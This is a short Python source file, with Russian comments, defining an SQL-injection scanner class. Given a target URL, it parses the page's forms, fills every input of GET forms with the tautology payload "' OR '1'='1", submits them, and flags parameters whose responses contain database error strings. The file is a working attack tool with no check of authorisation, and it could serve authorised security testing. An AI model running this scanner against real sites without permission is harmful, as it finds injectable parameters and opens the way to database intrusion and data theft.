import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from typing import List, Dict, Optional

class SQLInjectionTester:
    """Класс для тестирования SQL-инъекций"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Air-GC/0.1'
        })
    
    def test_get_parameters(self) -> Dict[str, List[str]]:
        """Тестирует GET-параметры на уязвимость к SQL-инъекциям"""
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        results = {}
        
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            form_url = urljoin(self.target_url, form_action)
            
            inputs = form.find_all('input')
            params = {}
            
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    params[name] = "' OR '1'='1"
            
            if form_method == 'get' and params:
                test_response = self.session.get(form_url, params=params)
                if self._check_vulnerability(test_response.text):
                    results[form_url] = list(params.keys())
        
        return results
    
    def _check_vulnerability(self, response_text: str) -> bool:
        """Проверяет ответ на признаки уязвимости"""
        indicators = [
            'SQL syntax',
            'MySQL error',
            'syntax error',
            'unclosed quotation mark',
            'ORA-00933',
            'Warning: mysql'
        ]
        
        return any(indicator in response_text for indicator in indicators)